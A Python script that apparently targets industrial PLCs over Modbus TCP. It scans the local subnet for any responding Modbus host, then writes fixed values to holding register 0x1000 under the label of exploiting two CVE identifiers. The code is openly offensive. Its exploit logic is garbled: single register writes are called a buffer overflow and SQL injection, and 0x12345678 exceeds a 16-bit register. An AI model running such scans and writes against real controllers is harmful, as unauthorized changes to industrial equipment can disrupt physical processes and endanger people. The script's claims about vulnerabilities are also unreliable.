from pymodbus.client.sync import ModbusTcpClient
import socket

# Function to find the PLC's IP address
def find_plc_ip():
    # Assuming the PLC is on the same subnet as the Windows machine
    ip_address = socket.gethostbyname(socket.gethostname())
    subnet = '.'.join(ip_address.split('.')[:3]) + '.'
    for i in range(1, 255):
        try:
            client = ModbusTcpClient(subnet + str(i))
            connection = client.connect()
            if connection:
                print(f"Found PLC at IP address: {subnet + str(i)}")
                return subnet + str(i)
        except Exception as e:
            pass
    return None

# Function to exploit a software vulnerability on the PLC
def exploit_vulnerability(client, vulnerability_id):
    # Use the write_register function from pymodbus
    # Note: The vulnerability_id might need to be adjusted based on the PLC's memory layout
    try:
        # Get the current register value
        current_value = client.read_holding_registers(0x1000, 1)
        current_value = current_value.registers[0]
        
        # Exploit the vulnerability
        if vulnerability_id == "CVE-2022-1234":
            # Example: Exploit a buffer overflow vulnerability
            client.write_register(0x1000, 0x12345678)
        elif vulnerability_id == "CVE-2022-5678":
            # Example: Exploit a SQL injection vulnerability
            client.write_register(0x1000, 0x90123456)
        else:
            print("Unknown vulnerability ID")
        
        # Get the new register value
        new_value = client.read_holding_registers(0x1000, 1)
        new_value = new_value.registers[0]
        
        # Check if the exploit was successful
        if new_value!= current_value:
            print(f"Exploited vulnerability {vulnerability_id} on PLC")
        else:
            print(f"Failed to exploit vulnerability {vulnerability_id} on PLC")
    except Exception as e:
        print(f"Failed to exploit vulnerability {vulnerability_id} on PLC: {e}")

# Function to read a register on the PLC
def read_register(client, register_address):
    # Use the read_holding_registers function from pymodbus
    # Note: The register_address might need to be adjusted based on the PLC's memory layout
    try:
        # Get the current register value
        current_value = client.read_holding_registers(register_address, 1)
        current_value = current_value.registers[0]
        print(f"Current register value at address {register_address}: {current_value}")
    except Exception as e:
        print(f"Failed to read register at address {register_address}: {e}")

# Example usage
if __name__ == "__main__":
    try:
        # Find the PLC's IP address
        plc_ip_address = find_plc_ip()
        if plc_ip_address:
            # Create a Modbus client
            client = ModbusTcpClient(plc_ip_address)
            connection = client.connect()
            print(f"Connected to PLC: {connection}")
            
            # Exploit a software vulnerability on the PLC
            vulnerability_id = "CVE-2022-1234"
            exploit_vulnerability(client, vulnerability_id)
            
            # Read a register on the PLC
            register_address = 0x1000
            read_register(client, register_address)
        else:
            print("Failed to find PLC's IP address")
    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        # Close the client
        if 'client' in locals():
            client.close()